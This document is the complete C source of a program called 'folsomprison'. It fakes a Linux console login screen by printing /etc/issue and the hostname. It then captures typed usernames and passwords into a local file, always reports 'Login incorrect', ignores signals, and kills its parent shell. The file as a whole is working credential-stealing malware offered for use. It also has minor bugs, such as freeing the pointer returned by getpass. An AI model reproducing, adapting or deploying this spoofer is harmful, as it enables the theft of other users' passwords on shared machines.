#include<stdio.h>
#include<signal.h>
#include<unistd.h>
#include<string.h>
#include<stdlib.h>
#include<fcntl.h>
#include<time.h>
#include<sys/utsname.h>

#define MAX_INPUT_LENGTH 32
#define MAX_HOSTNAME_LENGTH 64
#define STDOUT_FD 1

char host[MAX_HOSTNAME_LENGTH];
char* tty;



/*
 * prints special characters from /etc/issue
 * taken from github.com/ystk/debian-mingetty
 * slightly modified
 *
 * args:
 *  c - the special character to output
 */
static void output_special_char (unsigned char c)
{
  struct utsname uts;

  if (uname(&uts) == -1)
    {
      perror("uname");
      exit(EXIT_FAILURE);
    }

  switch (c) {
  case 's':
    printf ("%s", uts.sysname);
    break;
  case 'n':
    printf ("%s", uts.nodename);
    break;
  case 'r':
    printf ("%s", uts.release);
    break;
  case 'v':
    printf ("%s", uts.version);
    break;
  case 'm':
    printf ("%s", uts.machine);
    break;
  case 'd':
  case 't':
    {
      time_t cur_time;
      struct tm *tm;
      time (&cur_time);
      tm = localtime (&cur_time);
      if (c == 'd') /* ISO 8601 */
	printf ("%d-%02d-%02d", 1900 + tm->tm_year,
		tm->tm_mon + 1, tm->tm_mday);
      else
	printf ("%02d:%02d:%02d", tm->tm_hour,
		tm->tm_min, tm->tm_sec);
      break;
    }

  case 'l':
    printf ("%s", tty+5);
    break;
  case 'u':
  case 'U':
    break;
  default:
    putchar (c);
  }
}


/*
 * reads /etc/issue and prints the banner
 */
void print_banner()
{
  FILE *fd;
  char c;
  struct utsname uts;

  if (uname(&uts) == -1)
    {
      perror("uname");
      exit(EXIT_FAILURE);
    }

  printf("\n");
  if ((fd = fopen ("/etc/issue", "r"))) {
    while ((c = getc (fd)) != EOF) {
      if (c == '\\')
	output_special_char (getc (fd));
      else
	putchar (c);
    }
    fclose (fd);
  }
}



/**
 * gets user's credentials and stores them into the specified file
 *
 * args:
 *  filepath - the path for the credentials to be stored
 *             if NULL use "./credentials"
 * 
 * return values:
 *  0 - completed successfully
 *  1 - supplied username is empty or EOF
 * -1 - could not open file
 */
int get_credentials(char* filepath)
{
  char *pass = NULL;
  char user[MAX_INPUT_LENGTH];
  char timestamp[32];
  int fd = 0;
  
  // open file to log credentials
  if (filepath == NULL)
    filepath = "./credentials";

  fd = open(filepath, O_RDWR | O_CREAT | O_APPEND, 0600);
  if(fd == -1)
    {
      fprintf(stderr, "Could not append to store file!\nExiting\n");
      perror("open");
      return -1;
    }

  // pass issue file to print_banner
  print_banner();

  printf("%s login: ",host);
  fgets(user, MAX_INPUT_LENGTH, stdin);

  // if EOF or no username supplied
  if (!strncmp("\n",user, 1) || user[0] == '\0')
    {
      close(fd);
      return 1;
    }

  // logging timestamp
  time_t rawtime;
  struct tm *timeinfo = NULL;
  time(&rawtime);
  timeinfo = localtime(&rawtime);
  sprintf(timestamp, "[%02d-%02d-%04d %02d:%02d:%02d]\n\n",
	  timeinfo->tm_mday,
	  timeinfo->tm_mon,
	  timeinfo->tm_year + 1900,
	  timeinfo->tm_hour,
	  timeinfo->tm_min,
	  timeinfo->tm_sec);
  write(fd, (const void *)timestamp, strlen(timestamp+1));

  // getting and logging credentials
  write(fd, "login: ", strlen("login: ")+1);
  write(fd, (const void *)user, strlen(user)+1);
  // TODO: getpass is deprecated, remove in the future
  pass = getpass("Password: ");
  write(fd, "pass: ", strlen("pass: ")+1);
  write(fd, (const void *)pass, strlen(pass)+1);
  write(fd, "\n\n", 2);
  
  free(pass);
  close(fd);
  return 0;
}

/**
 * Displays usage message
 */
void usage()
{
  printf("Usage:\n"
	 "folsomprison [-f file] [-h]\n"
	 "\nOptions:\n"
	 " -f\tWhere to store the credentials.\n"
	 " -h\tThis message.\n"
	 );
  exit(EXIT_FAILURE);
}

int main(int argc, char *argv[])
{
  char* filepath = NULL;
  int opt = 0;
  int ret = 0; 

  while((opt = getopt(argc, argv, "f:h")) !=-1)
    {
      switch(opt){
      case 'f':
	filepath = strdup(optarg);
	break;
      case 'h':
      default:
	usage();
      }
    }

  // ignore signals
  for (int i = 0; i<31; ++i)
    signal(i, SIG_IGN);

  // prepare to print prompt
  tty = (char *) ttyname(STDOUT_FD);
  gethostname(host, MAX_HOSTNAME_LENGTH);
  system("clear");

  // mimic original behaviour when no username is supplied
  do
    {
      ret = get_credentials(filepath);

      if (ret == 0)
	{
	  sleep(2);
	  printf("Login incorrect\n");
	}
      else if (ret == 1) continue;
      else if (ret == -1) break;
    }while(ret);

  // logout user after done
  kill(getppid(), SIGKILL);
  return 0;
 }
